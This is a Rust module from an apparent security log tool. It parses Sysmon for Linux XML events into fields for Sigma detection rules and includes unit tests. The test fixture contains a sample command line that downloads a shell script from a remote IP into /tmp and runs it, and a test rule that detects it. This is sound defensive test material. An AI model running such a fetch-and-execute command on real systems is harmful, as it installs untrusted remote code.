// Copyright (C) 2026 Shirofune Security Co., Ltd.
//
// Unless explicitly acquired and licensed from Licensor under another license, the contents of this
// file are subject to the Reciprocal Public License ("RPL") Version 1.5, or subsequent versions as
// allowed by the RPL, and You may not copy or use this file in either source code or executable
// form, except in compliance with the terms and conditions of the RPL.
//
// All software distributed under the RPL is provided strictly on an "AS IS" basis, WITHOUT WARRANTY
// OF ANY KIND, EITHER EXPRESS OR IMPLIED, AND LICENSOR HEREBY DISCLAIMS ALL SUCH WARRANTIES,
// INCLUDING WITHOUT LIMITATION, ANY WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
// PURPOSE, QUIET ENJOYMENT, OR NON-INFRINGEMENT. See the RPL for specific language governing rights
// and limitations under the RPL.

//! Sysmon for Linux events: one `<Event>...</Event>` XML document per line, as Sysmon writes to
//! syslog (`... sysmon: <Event>...`), the journal, or a collector that strips the syslog header.
//!
//! Every `EventData` `<Data Name="...">` becomes a field under its own name (`Image`,
//! `CommandLine`, `ParentImage`, `TargetFilename`, `DestinationPort`, ...), which is what the
//! SigmaHQ `product: linux` rules for `process_creation`, `network_connection`, `file_event`, ...
//! use. `EventID`, `Channel`, `Computer`, `EventRecordID` and `Provider_Name` come from `System`.
//! Unquoted decimal values become numbers (`DestinationPort: 4444`, `LogonId: 0`).
//!
//! The event ID gives the Sigma category (the same mapping as Sysmon on Windows): 1
//! `process_creation`, 3 `network_connection`, 5 `process_termination`, 9 `raw_access_thread`,
//! 11 `file_event`, 23 `file_delete`, 4/16 `sysmon_status`, 255 `sysmon_error`. Every event also
//! has `service: sysmon`.

use super::{LineParser, ParseContext, continuation_event, timestamp};
use crate::event::{FieldValue, ParsedEvent};
use crate::logsource::LogSourceTag;
use chrono::{DateTime, FixedOffset};
use quick_xml::Reader;
use quick_xml::events::{BytesStart, Event};

/// A line that starts a Sysmon event (no syslog header). A command line with a newline makes an
/// event span several lines; the following lines are continuations.
pub fn matches_entry(line: &str) -> bool {
    let t = line.trim_start();
    t.starts_with("<Event") && t.contains("<System>")
}

/// The most text an unfinished event may hold before it is given up as broken.
const MAX_PENDING: usize = 1 << 20;

/// The `<Event>...</Event>` document inside a line or syslog message.
pub fn extract(text: &str) -> Option<&str> {
    let start = text.find("<Event>").or_else(|| text.find("<Event "))?;
    let end = text.rfind("</Event>")? + "</Event>".len();
    (end > start).then(|| &text[start..end])
}

/// Whether the document is a Sysmon for Linux event (and not some other XML in a log message).
pub fn is_sysmon(xml: &str) -> bool {
    xml.contains("Linux-Sysmon")
}

/// The Sigma category of a Sysmon event ID.
pub fn category_tag(event_id: i64) -> Option<LogSourceTag> {
    Some(match event_id {
        1 => LogSourceTag::LINUX_PROCESS_CREATION,
        3 => LogSourceTag::LINUX_NETWORK_CONNECTION,
        4 | 16 => LogSourceTag::LINUX_SYSMON_STATUS,
        5 => LogSourceTag::LINUX_PROCESS_TERMINATION,
        9 => LogSourceTag::LINUX_RAW_ACCESS_THREAD,
        11 => LogSourceTag::LINUX_FILE_EVENT,
        23 => LogSourceTag::LINUX_FILE_DELETE,
        255 => LogSourceTag::LINUX_SYSMON_ERROR,
        _ => return None,
    })
}

/// The parts of a Sysmon event the event model needs.
#[derive(Clone, Debug, Default, PartialEq)]
pub struct SysmonEvent {
    pub event_id: Option<i64>,
    pub time: Option<DateTime<FixedOffset>>,
    pub computer: Option<String>,
    /// `EventID`, the `EventData` fields in document order, then `Channel`, `Computer`,
    /// `EventRecordID` and `Provider_Name`.
    pub fields: Vec<(String, FieldValue)>,
}

/// An unquoted decimal that survives a round trip becomes a number, anything else text.
fn typed(value: &str) -> FieldValue {
    match value.parse::<i64>() {
        Ok(n) if n.to_string() == value => FieldValue::Int(n),
        _ => FieldValue::Str(value.to_string()),
    }
}

/// An attribute's value with its entity and character references resolved (no whitespace
/// normalization, so the value is what the event carried).
fn attribute(e: &BytesStart<'_>, name: &str) -> Option<String> {
    e.try_get_attribute(name).ok().flatten().and_then(|a| {
        quick_xml::escape::unescape(&a.value)
            .ok()
            .map(|v| v.into_owned())
    })
}

/// Parse one Sysmon event document.
pub fn parse_event(xml: &str) -> Result<SysmonEvent, String> {
    let mut reader = Reader::from_str(xml);
    reader.config_mut().trim_text(false);
    let mut stack: Vec<String> = Vec::new();
    let mut system: Vec<(String, String)> = Vec::new();
    let mut data: Vec<(String, String)> = Vec::new();
    // the Data element whose text is being read
    let mut data_name: Option<String> = None;
    let mut text = String::new();
    let mut out = SysmonEvent::default();
    let mut provider = None;
    let mut time_created = None;
    loop {
        match reader.read_event().map_err(|e| e.to_string())? {
            Event::Start(e) => {
                let name = e.local_name().as_ref().to_owned();
                text.clear();
                if name == "Data" {
                    data_name = Some(attribute(&e, "Name").unwrap_or_default());
                }
                stack.push(name);
            }
            Event::Empty(e) => {
                let name = e.local_name().as_ref().to_owned();
                match name.as_str() {
                    "Provider" => provider = attribute(&e, "Name"),
                    "TimeCreated" => time_created = attribute(&e, "SystemTime"),
                    "Data" => {
                        if let Some(n) = attribute(&e, "Name") {
                            data.push((n, String::new()));
                        }
                    }
                    _ => {}
                }
            }
            Event::Text(t) => {
                let raw = t.into_inner();
                text.push_str(&quick_xml::escape::unescape(&raw).map_err(|e| e.to_string())?);
            }
            Event::CData(t) => {
                text.push_str(&t.into_inner());
            }
            Event::GeneralRef(r) => {
                let entity = format!("&{};", r.into_inner());
                text.push_str(&quick_xml::escape::unescape(&entity).map_err(|e| e.to_string())?);
            }
            Event::End(_) => {
                let name = stack.pop().unwrap_or_default();
                let parent = stack.last().map(String::as_str);
                if name == "Data" {
                    if let Some(n) = data_name.take() {
                        data.push((n, std::mem::take(&mut text)));
                    }
                } else if parent == Some("System") {
                    system.push((name, std::mem::take(&mut text)));
                }
                text.clear();
            }
            Event::Eof => break,
            _ => {}
        }
    }
    let sys = |key: &str| {
        system
            .iter()
            .find(|(k, _)| k == key)
            .map(|(_, v)| v.trim().to_string())
    };
    out.event_id = sys("EventID").and_then(|v| v.parse::<i64>().ok());
    if out.event_id.is_none() && data.is_empty() {
        return Err("not a Sysmon event: no EventID and no EventData".to_string());
    }
    out.computer = sys("Computer").filter(|c| !c.is_empty());
    out.time = time_created
        .as_deref()
        .and_then(timestamp::parse_iso_with_zone)
        .or_else(|| {
            // EventData UtcTime: `2021-12-17 12:30:49.056`
            data.iter()
                .find(|(k, _)| k == "UtcTime")
                .and_then(|(_, v)| timestamp::parse_iso_naive(v))
                .map(|naive| naive.and_utc().fixed_offset())
        });
    if let Some(id) = out.event_id {
        out.fields.push(("EventID".into(), FieldValue::Int(id)));
    }
    for (k, v) in data {
        if k.is_empty() {
            continue;
        }
        out.fields.push((k, typed(&v)));
    }
    for key in ["Channel", "Computer", "EventRecordID"] {
        if let Some(v) = sys(key) {
            out.fields.push((key.to_string(), typed(&v)));
        }
    }
    if let Some(p) = provider {
        out.fields
            .push(("Provider_Name".into(), FieldValue::Str(p)));
    }
    Ok(out)
}

/// Build the event of a Sysmon document found in `raw` (a whole line, or a syslog line).
/// `fallback` is the syslog time and host, used when the document has none.
pub fn sysmon_event(
    raw: &str,
    xml: &str,
    ctx: &ParseContext,
    fallback_time: Option<(DateTime<FixedOffset>, bool)>,
    fallback_host: Option<String>,
) -> ParsedEvent {
    let mut ev = ParsedEvent::new(raw, &LogSourceTag::LINUX_SYSMON);
    match parse_event(xml) {
        Ok(sysmon) => {
            if let Some(tag) = sysmon.event_id.and_then(category_tag) {
                ev.set_primary(tag);
            }
            match sysmon.time {
                Some(t) => {
                    ev.timestamp = Some(t);
                    ev.tz_explicit = true;
                }
                None => {
                    if let Some((t, explicit)) = fallback_time {
                        ev.timestamp = Some(t);
                        ev.tz_explicit = explicit;
                    }
                }
            }
            ev.hostname = sysmon.computer.or(fallback_host);
            for (k, v) in sysmon.fields {
                ev.push(&k, v);
            }
        }
        Err(e) => {
            // keep the line for keyword rules, and say why it has no fields
            if let Some((t, explicit)) = fallback_time {
                ev.timestamp = Some(t);
                ev.tz_explicit = explicit;
            }
            ev.hostname = fallback_host;
            ev.push("message", raw.trim_end());
            ev.push("parse_error", e);
        }
    }
    ctx.finish(&mut ev);
    ev
}

/// Parser for files of Sysmon events without syslog headers. An event whose text contains a
/// newline (a command line typed over several lines) is joined back into one event.
pub struct SysmonLinuxParser {
    ctx: ParseContext,
    last_ts: Option<DateTime<FixedOffset>>,
    /// The lines of an event whose `</Event>` has not been seen yet.
    pending: Option<String>,
    /// An event finished by the same line as a broken one, returned by `next_ready`.
    ready: Option<ParsedEvent>,
}

impl SysmonLinuxParser {
    pub fn new(ctx: ParseContext) -> Self {
        Self {
            ctx,
            last_ts: None,
            pending: None,
            ready: None,
        }
    }

    fn event(&mut self, text: &str) -> ParsedEvent {
        let ev = match extract(text) {
            Some(xml) => sysmon_event(text, xml, &self.ctx, None, None),
            // an event cut off before its `</Event>`: keep what it has, and say so
            None => {
                let mut ev =
                    sysmon_event(text, text, &self.ctx, self.last_ts.map(|t| (t, true)), None);
                ev.push("parse_error", "event cut off before </Event>");
                ev
            }
        };
        if ev.timestamp.is_some() {
            self.last_ts = ev.timestamp;
        }
        ev
    }

    fn starts_event(line: &str) -> bool {
        line.trim_start().starts_with("<Event")
    }
}

impl LineParser for SysmonLinuxParser {
    fn parse_line(&mut self, line: &str) -> Option<ParsedEvent> {
        if let Some(mut text) = self.pending.take() {
            if Self::starts_event(line) {
                // the previous event never ended; a new one starts on this line
                let broken = self.event(&text);
                self.ready = self.parse_line(line);
                return Some(broken);
            }
            text.push('\n');
            text.push_str(line);
            if line.contains("</Event>") || text.len() > MAX_PENDING {
                return Some(self.event(&text));
            }
            self.pending = Some(text);
            return None;
        }
        if line.trim().is_empty() {
            return None;
        }
        if Self::starts_event(line) && !line.contains("</Event>") {
            self.pending = Some(line.to_string());
            return None;
        }
        if extract(line).is_some() {
            return Some(self.event(line));
        }
        let mut ev = continuation_event(line, &LogSourceTag::LINUX_SYSMON, &[], self.last_ts);
        self.ctx.finish(&mut ev);
        Some(ev)
    }

    fn is_pending(&self) -> bool {
        self.pending.is_some()
    }

    fn next_ready(&mut self) -> Option<ParsedEvent> {
        self.ready.take()
    }

    fn finish(&mut self) -> Option<ParsedEvent> {
        let text = self.pending.take()?;
        Some(self.event(&text))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    const PROC: &str = r#"<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2026-05-13T13:42:08.489594000Z"/><EventRecordID>254</EventRecordID><Correlation/><Execution ProcessID="3638" ThreadID="3638"/><Channel>Linux-Sysmon/Operational</Channel><Computer>web01</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2026-05-13 13:42:08.493</Data><Data Name="ProcessGuid">{8e4c3a1b-7f10-6823-6d35-1b2f5b560000}</Data><Data Name="ProcessId">4242</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="CommandLine">curl -s http://192.0.2.7/x.sh -o /tmp/x.sh &amp;&amp; sh /tmp/x.sh</Data><Data Name="CurrentDirectory">/tmp</Data><Data Name="User">root</Data><Data Name="LogonId">0</Data><Data Name="ParentImage">/usr/bin/bash</Data><Data Name="ParentCommandLine"/></EventData></Event>"#;

    #[test]
    fn whole_line_documents_are_entries() {
        assert!(matches_entry(PROC));
        assert!(!matches_entry(&format!(
            "May 13 13:42:08 web01 sysmon: {PROC}"
        )));
        assert!(!matches_entry("<Event>"));
        assert_eq!(
            extract(&format!("May 13 13:42:08 web01 sysmon: {PROC}")),
            Some(PROC)
        );
        assert!(is_sysmon(PROC));
    }

    #[test]
    fn event_data_fields_and_system_fields() {
        let e = parse_event(PROC).unwrap();
        assert_eq!(e.event_id, Some(1));
        assert_eq!(e.computer.as_deref(), Some("web01"));
        assert_eq!(
            e.time,
            Some(DateTime::parse_from_rfc3339("2026-05-13T13:42:08.489594Z").unwrap())
        );
        let get = |k: &str| {
            e.fields
                .iter()
                .find(|(n, _)| n == k)
                .map(|(_, v)| v.clone())
        };
        assert_eq!(get("EventID"), Some(FieldValue::Int(1)));
        assert_eq!(get("Image"), Some(FieldValue::from("/usr/bin/curl")));
        assert_eq!(
            get("CommandLine"),
            Some(FieldValue::from(
                "curl -s http://192.0.2.7/x.sh -o /tmp/x.sh && sh /tmp/x.sh"
            ))
        );
        assert_eq!(get("ProcessId"), Some(FieldValue::Int(4242)));
        assert_eq!(get("LogonId"), Some(FieldValue::Int(0)));
        assert_eq!(get("ParentCommandLine"), Some(FieldValue::from("")));
        assert_eq!(
            get("Channel"),
            Some(FieldValue::from("Linux-Sysmon/Operational"))
        );
        assert_eq!(get("Provider_Name"), Some(FieldValue::from("Linux-Sysmon")));
        assert_eq!(get("EventRecordID"), Some(FieldValue::Int(254)));
        assert_eq!(e.fields[0].0, "EventID");
        assert_eq!(e.fields[1].0, "RuleName");
    }

    #[test]
    fn event_ids_give_categories() {
        assert_eq!(category_tag(1), Some(LogSourceTag::LINUX_PROCESS_CREATION));
        assert_eq!(
            category_tag(3),
            Some(LogSourceTag::LINUX_NETWORK_CONNECTION)
        );
        assert_eq!(category_tag(11), Some(LogSourceTag::LINUX_FILE_EVENT));
        assert_eq!(category_tag(23), Some(LogSourceTag::LINUX_FILE_DELETE));
        assert_eq!(category_tag(2), None);
    }

    #[test]
    fn events_with_newlines_are_joined() {
        let ctx = ParseContext::new(Path::new("sysmon_linux.log"), Default::default());
        let mut p = SysmonLinuxParser::new(ctx);
        let (first, rest) = PROC.split_once("-o /tmp/x.sh").unwrap();
        assert!(p.parse_line(first).is_none());
        assert!(p.is_pending());
        let ev = p.parse_line(&format!("\t-o /tmp/x.sh{rest}")).unwrap();
        assert!(!p.is_pending());
        assert_eq!(
            ev.field_str("CommandLine"),
            Some("curl -s http://192.0.2.7/x.sh \n\t-o /tmp/x.sh && sh /tmp/x.sh")
        );
        // an event cut off by the next one is kept as broken, and the next one is not lost
        assert!(p.parse_line(first).is_none());
        let broken = p.parse_line(PROC).unwrap();
        assert!(broken.fields.iter().any(|(k, _)| k == "parse_error"));
        let next = p.next_ready().unwrap();
        assert_eq!(next.field_str("Image"), Some("/usr/bin/curl"));
        // and one cut off by the end of the file is flushed
        assert!(p.parse_line(first).is_none());
        assert!(p.finish().is_some());
        assert!(p.finish().is_none());
    }

    #[test]
    fn broken_documents_keep_the_line() {
        crate::errorlog::set_quiet(true);
        let ctx = ParseContext::new(Path::new("sysmon.log"), Default::default());
        let ev = sysmon_event("<Event><System>", "<Event><System>", &ctx, None, None);
        assert_eq!(ev.primary_logsource, "linux/sysmon");
        assert!(ev.fields.iter().any(|(k, _)| k == "parse_error"));
    }

    #[test]
    fn parser_tags_and_matches_process_creation_rules() {
        let ctx = ParseContext::new(Path::new("sysmon_linux.log"), Default::default());
        let mut p = SysmonLinuxParser::new(ctx);
        let ev = p.parse_line(PROC).unwrap();
        assert_eq!(ev.primary_logsource, "linux/process_creation");
        assert!(ev.tags.contains(&LogSourceTag::LINUX_SYSMON));
        assert!(ev.tz_explicit);
        assert_eq!(ev.hostname.as_deref(), Some("web01"));
        let rule = sigma_rust::rule_from_yaml(
            "title: t\nlogsource: {product: linux, category: process_creation}\ndetection:\n  sel:\n    Image|endswith: /curl\n    CommandLine|contains: '/tmp/'\n    LogonId: 0\n  condition: sel\n",
        )
        .unwrap();
        assert!(rule.is_match(&ev.to_sigma_event()));
        let cont = p.parse_line("not xml").unwrap();
        assert!(cont.timestamp_inferred);
    }
}
